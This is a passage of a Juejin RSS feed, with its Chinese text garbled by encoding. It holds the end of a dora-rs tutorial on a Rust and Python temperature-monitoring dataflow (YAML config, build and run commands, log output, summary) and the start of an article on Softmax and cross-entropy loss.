<h4 data-id="heading-17">7. å®Œæ•´æ•°æ®æµé…ç½®</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># dataflow.yml (å®Œæ•´å››èŠ‚ç‚¹ç‰ˆ)</span>
<span class="hljs-attr">nodes:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">temp_sensor</span>
    <span class="hljs-attr">build:</span> <span class="hljs-string">cargo</span> <span class="hljs-string">build</span> <span class="hljs-string">-p</span> <span class="hljs-string">sensor_node</span>
    <span class="hljs-attr">path:</span> <span class="hljs-string">target/debug/sensor_node</span>
    <span class="hljs-attr">inputs:</span>
      <span class="hljs-attr">tick:</span> <span class="hljs-string">dora/timer/millis/100</span>
    <span class="hljs-attr">outputs:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">temp_raw</span>

  <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">data_processor</span>
    <span class="hljs-attr">build:</span> <span class="hljs-string">cargo</span> <span class="hljs-string">build</span> <span class="hljs-string">-p</span> <span class="hljs-string">processor_node</span>
    <span class="hljs-attr">path:</span> <span class="hljs-string">target/debug/processor_node</span>
    <span class="hljs-attr">inputs:</span>
      <span class="hljs-attr">temp:</span> <span class="hljs-string">temp_sensor/temp_raw</span>
    <span class="hljs-attr">outputs:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">temp_smoothed</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">temp_alert</span>

  <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">logger</span>
    <span class="hljs-attr">build:</span> <span class="hljs-string">cargo</span> <span class="hljs-string">build</span> <span class="hljs-string">-p</span> <span class="hljs-string">logger_node</span>
    <span class="hljs-attr">path:</span> <span class="hljs-string">target/debug/logger_node</span>
    <span class="hljs-attr">inputs:</span>
      <span class="hljs-attr">smoothed:</span> <span class="hljs-string">data_processor/temp_smoothed</span>
      <span class="hljs-attr">alert:</span> <span class="hljs-string">data_processor/temp_alert</span>

  <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">visualizer</span>
    <span class="hljs-attr">path:</span> <span class="hljs-string">visualizer-node/visualizer_node/main.py</span>
    <span class="hljs-attr">inputs:</span>
      <span class="hljs-attr">data:</span> <span class="hljs-string">data_processor/temp_smoothed</span>

</code></pre>
<h4 data-id="heading-18">ç¼–è¯‘è¿è¡Œï¼ˆMacOS M1ï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. pythoné¡¹ç›®ä¾èµ–ç®¡ç†</span>
<span class="hljs-built_in">cd</span> visualizer-node &amp;&amp; uv install

<span class="hljs-comment"># 2. æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ, åœ¨dora up ä¹‹å‰ ï¼Œå¦åˆ™ ä¼šæŠ¥é”™ï¼šæ‰¾ä¸åˆ°pythonè·¯å¾„</span>
<span class="hljs-built_in">source</span> visualizer-node/.venv/bin/activate

<span class="hljs-comment"># 3. æ„å»ºæ‰€æœ‰RustèŠ‚ç‚¹ï¼ˆM1ç¼–è¯‘é£å¿«ï¼‰</span>
dora build dataflow.yml

<span class="hljs-comment">#4. å¯åŠ¨å®ˆæŠ¤è¿›ç¨‹</span>
dora up

<span class="hljs-comment"># 5. è¿è¡Œæ•°æ®æµ</span>
dora start dataflow.yml

<span class="hljs-comment"># 6. åœ¨å¦ä¸€ä¸ªç»ˆç«¯æŸ¥çœ‹çŠ¶æ€</span>
dora list

</code></pre>
<p><strong>é¢„æœŸè¾“å‡º</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">2025-12-12T10:33:47.988647Z  INFO dora_core::descriptor::validate: skipping path check <span class="hljs-keyword">for</span> node with build <span class="hljs-built_in">command</span>
2025-12-12T10:33:47.988649Z  INFO dora_core::descriptor::validate: skipping path check <span class="hljs-keyword">for</span> node with build <span class="hljs-built_in">command</span>
2025-12-12T10:33:47.991297Z  INFO zenoh::net::runtime: Using ZID: 8b8a68bebfc1f776ff2fd1a5a0d3622c
2025-12-12T10:33:47.998142Z  INFO zenoh::net::runtime::orchestrator: Zenoh can be reached at: tcp/[fe80::1]:57716
......
025-12-12T10:33:47.998392Z  INFO zenoh::net::runtime::orchestrator: zenohd listening scout messages on 224.0.0.224:7446
data_processor: DEBUG  daemon::spawner    spawning node
logger: DEBUG  daemon::spawner    spawning node
temp_sensor: DEBUG  daemon::spawner    spawning node
visualizer: DEBUG  daemon::spawner    spawning node
......
data_processor: INFO   daemon    node is ready
logger: INFO   daemon    node is ready
temp_sensor: INFO   daemon    node is ready
visualizer: INFO   daemon    node is ready
INFO   daemon    all nodes are ready, starting dataflow
temp_sensor: stdout    ğŸŒ¡ï¸ ä¼ æ„Ÿå™¨èŠ‚ç‚¹å¯åŠ¨ (M1 Proä¼˜åŒ–ç‰ˆ)
data_processor: stdout    ğŸ§® å¤„ç†å™¨èŠ‚ç‚¹å¯åŠ¨ (æ»‘åŠ¨çª—å£+å¼‚å¸¸æ£€æµ‹)
logger: stdout    æ—¥å¿—èŠ‚ç‚¹å¯åŠ¨
visualizer: stdout      ani = animation.FuncAnimation(
[23.1Â°C] â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
...
</code></pre>
<p><strong>è¿è¡Œæ•ˆæœ</strong>ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0849d4df0d042269151342339f08b5b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUnVzdOefpeihjOekvg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394885&amp;x-signature=mpPNmHt5q5Y%2FYTIY5%2FQVydMFjjg%3D" alt="ScreenShot_2025-12-15_171239_920.png" loading="lazy"/></p>
<p><strong>GitHubä»“åº“</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FDoomking%2Frust-zhixingshe-examples%2Ftree%2Fmain%2Fdora%2Fdora-temp-monitor-rust" target="_blank" title="https://github.com/Doomking/rust-zhixingshe-examples/tree/main/dora/dora-temp-monitor-rust" ref="nofollow noopener noreferrer">github.com/Doomking/ruâ€¦</a></p>
<hr/>
<h3 data-id="heading-19">ä¸‰ æ ¸å¿ƒè¦ç‚¹æ€»ç»“</h3>
<p><strong><code>dora-rs</code> çš„ä»·å€¼</strong>åœ¨äºï¼Œå®ƒå°†æ„å»ºå¤æ‚å®æ—¶ç³»ç»Ÿçš„<strong>æ¶æ„å¤æ‚æ€§</strong>ä¸<strong>ä¸šåŠ¡é€»è¾‘å¤æ‚æ€§</strong>è§£è€¦ã€‚å¼€å‘è€…å¯ä»¥æ›´ä¸“æ³¨äºæ¯ä¸ªèŠ‚ç‚¹çš„æ ¸å¿ƒç®—æ³•ï¼Œè€Œå°†èŠ‚ç‚¹é—´é€šä¿¡ã€æ•°æ®åºåˆ—åŒ–ã€ç”Ÿå‘½å‘¨æœŸç®¡ç†ç­‰ç¹çé—®é¢˜äº¤ç»™æ¡†æ¶ã€‚</p>























































<table><thead><tr><th>æ¦‚å¿µ</th><th>ä¸€å¥è¯ç†è§£</th><th>å®æˆ˜æŠ€å·§</th></tr></thead><tbody><tr><td><strong>Dataflow</strong></td><td>åº”ç”¨çš„"æ–½å·¥å›¾"</td><td><code>YAML</code> å®šä¹‰ï¼Œå…ˆç”»åå†™ä»£ç </td></tr><tr><td><strong>Node</strong></td><td>ç‹¬ç«‹å·¥äººè¿›ç¨‹</td><td>è·¨è¯­è¨€æ··ç¼–ï¼Œæ•…éšœéš”ç¦»</td></tr><tr><td><strong>Operator</strong></td><td>å·¥äººæ‰‹é‡Œçš„å·¥å…·</td><td>å•è¿›ç¨‹ï¼Œé€‚åˆé«˜é¢‘è®¡ç®—</td></tr><tr><td><strong>Event Stream</strong></td><td>æ°¸ä¸é˜»å¡çš„æ”¶ä»¶ç®±</td><td><code>for event in node</code>é˜»å¡å¼ï¼ŒCPUé›¶ç©ºè½¬</td></tr><tr><td><strong>Arrow Data</strong></td><td>é›¶æ‹·è´é­”æ³•</td><td>&gt; <code>4KB</code> è‡ªåŠ¨èµ°å…±äº«å†…å­˜ï¼ŒM1ç»Ÿä¸€å†…å­˜æ¶æ„æ›´ä¼˜</td></tr><tr><td><strong>APIç»‘å®š</strong></td><td>å¤šè¯­è¨€å…¨å®¶æ¡¶</td><td>Rustæ€§èƒ½æœ€å¥½ï¼ŒPythonç”Ÿæ€æœ€ä¸°å¯Œ</td></tr><tr><td><strong>CLI</strong></td><td>æŒ‡æŒ¥ä¸­å¿ƒä¸‰å‰‘å®¢</td><td><code>build</code>ã€<code>start</code>ã€<code>list</code></td></tr><tr><td><strong>Daemon</strong></td><td>å•æœºè½¦é—´ä¸»ä»»</td><td>æœ¬åœ°å…±äº«å†…å­˜ç®¡ç†å™¨</td></tr><tr><td><strong>Coordinator</strong></td><td>åˆ†å¸ƒå¼æ€»ç»ç†</td><td>è·¨æœºå™¨åè°ƒï¼Œæ”¯æŒROS2çº§å¤æ‚ç³»ç»Ÿ</td></tr></tbody></table>
<p>é€šè¿‡è¿™ä¸ªå®æˆ˜é¡¹ç›®ï¼Œæˆ‘ä»¬ä½“éªŒäº† <code>dora-rs</code> çš„æ ¸å¿ƒå·¥ä½œæµç¨‹ï¼š</p>
<ol>
<li><strong>è“å›¾è®¾è®¡</strong>ï¼šç”¨ <code>YAML</code> å®šä¹‰æ¸…æ™°çš„æ•°æ®æµæ‹“æ‰‘ã€‚</li>
<li><strong>å¼‚æ„å¼€å‘</strong>ï¼šè‡ªç”±é€‰æ‹© Pythonï¼ˆä¼ æ„Ÿå™¨ã€ç»˜å›¾ï¼‰å’Œ Rustï¼ˆé«˜æ€§èƒ½è®¡ç®—ï¼‰å®ç°èŠ‚ç‚¹ã€‚</li>
<li><strong>é«˜æ•ˆé€šä¿¡</strong>ï¼šåº•å±‚åŸºäº <code>Arrow</code> çš„é›¶æ‹·è´æœºåˆ¶ï¼Œè®©è·¨è¯­è¨€æ•°æ®äº¤æ¢æ¯«æ— è´Ÿæ‹…ã€‚</li>
<li><strong>ç»Ÿä¸€è¿è¡Œ</strong>ï¼šä¸€ä¸ª <code>dora start</code> å‘½ä»¤æ‹‰èµ·æ‰€æœ‰ç»„ä»¶ï¼Œå¹¶æŒ‰è“å›¾è‡ªåŠ¨è¿æ¥ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-20">ğŸ“– å‚è€ƒèµ„æ–™</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdora-rs.ai%2Fzh-CN%2Fdocs%2Fguides%2F" target="_blank" title="https://dora-rs.ai/zh-CN/docs/guides/" ref="nofollow noopener noreferrer">dora-rså®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdora-rs%2Fdora-examples" target="_blank" title="https://github.com/dora-rs/dora-examples" ref="nofollow noopener noreferrer">dora-rsç¤ºä¾‹ä»“åº“</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdoracc.com%2Findex.html" target="_blank" title="https://doracc.com/index.html" ref="nofollow noopener noreferrer">dora-rsä¸­æ–‡ç¤¾åŒº</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Softmax ä¸ äº¤å‰ç†µæŸå¤±]]></title>    <link>https://juejin.cn/post/7583906478327889939</link>    <guid>https://juejin.cn/post/7583906478327889939</guid>    <pubDate>2025-12-15T09:36:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583906478327889939" data-draft-id="7583912899388407851" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Softmax ä¸ äº¤å‰ç†µæŸå¤±"/> <meta itemprop="keywords" content="ç®—æ³•,ç¥ç»ç½‘ç»œ"/> <meta itemprop="datePublished" content="2025-12-15T09:36:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AshinGau"/> <meta itemprop="url" content="https://juejin.cn/user/2154698521722679"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Softmax ä¸ äº¤å‰ç†µæŸå¤±
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2154698521722679/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AshinGau
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T09:36:34.000Z" title="Mon Dec 15 2025 09:36:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡æ¡£è¯¦ç»†è§£æäº†å¤šåˆ†ç±»ä»»åŠ¡ä¸­ <strong>Softmax</strong> ä¸ <strong>äº¤å‰ç†µæŸå¤± (Cross-Entropy Loss)</strong> çš„æ•°å­¦åŸç†ã€é…åˆæœºåˆ¶ä»¥åŠå·¥ç¨‹å®ç°ä¸­çš„æ•°å€¼ç¨³å®šæ€§é—®é¢˜ã€‚</p>
<hr/>
<h2 data-id="heading-0">1. æ ¸å¿ƒç†è®ºï¼šä» Logits åˆ° Loss</h2>
<p>å‡è®¾ç¥ç»ç½‘ç»œæœ€åä¸€å±‚çš„åŸå§‹è¾“å‡ºï¼ˆæœªå½’ä¸€åŒ–ï¼‰ä¸ºå‘é‡ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">o</mi></mrow><annotation encoding="application/x-tex">\mathbf{o}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4444em;"/><span class="mord mathbf">o</span></span></span></span></span>ï¼Œå…¶ä¸­ç¬¬ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> ä¸ªèŠ‚ç‚¹çš„è¾“å‡ºè®°ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>o</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">o_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ï¼ˆå·¥ç¨‹ä¸Šå¸¸ç§°ä¸º <strong>Logits</strong>ï¼‰ã€‚</p>
<h3 data-id="heading-1">1.1 Softmax å‡½æ•°ï¼šå½’ä¸€åŒ–</h3>
<p>Softmax çš„æ ¸å¿ƒä½œç”¨æ˜¯å°†ä»»æ„å®æ•°åŸŸçš„è¾“å‡º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>o</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">o_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> æ˜ å°„ä¸ºæ¦‚ç‡åˆ†å¸ƒ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ã€‚</p>
<p><strong>å…¬å¼ï¼š</strong>
<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub><mo>=</mo><mtext>Softmax</mtext><mo stretchy="false">(</mo><msub><mi>o</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mfrac><msup><mi>e</mi><msub><mi>o</mi><mi>i</mi></msub></msup><mrow><msubsup><mo>âˆ‘</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>C</mi></msubsup><msup><mi>e</mi><msub><mi>o</mi><mi>j</mi></msub></msup></mrow></mfrac></mrow><annotation encoding="application/x-tex">y_i = \text{Softmax}(o_i) = \frac{e^{o_i}}{\sum_{j=1}^{C} e^{o_j}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">Softmax</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.6629em;vertical-align:-0.7519em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.911em;"><span style="top:-2.5703em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8852em;"><span style="top:-2.1786em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-2.8971em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.4603em;"><span/></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.1952em;"/><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.779em;"><span style="top:-2.9714em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3448em;margin-left:0em;margin-right:0.1em;"><span class="pstrut" style="height:2.6595em;"/><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.5092em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7385em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3448em;margin-left:0em;margin-right:0.1em;"><span class="pstrut" style="height:2.6595em;"/><span class="mord mathnormal mtight">i</span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3147em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></p>
<ul>
